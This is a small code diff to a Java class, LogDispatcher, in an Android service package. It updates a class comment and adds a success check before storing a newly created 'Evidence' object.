@@ -24,9 +24,8 @@ import com.android.service.evidence.Evidence;
 import com.android.service.file.Path;
 import com.android.service.util.Check;
 
-// TODO: Auto-generated Javadoc
 /**
- * The Class LogDispatcher.
+ * The Class LogDispatcher collects LogR messages and manages the evidence creation, write and close.
  */
 public class LogDispatcher extends Thread implements Runnable {
 
@@ -235,8 +234,9 @@ public class LogDispatcher extends Thread implements Runnable {
 
 		final byte[] additional = p.getAdditional();
 		final Evidence evidence = new Evidence(p.getType());
-		evidence.createEvidence(additional);
-		evidences.put(p.getId(), evidence);
+		if(evidence.createEvidence(additional)){
+			evidences.put(p.getId(), evidence);
+		}
 
 		return true;
 	}
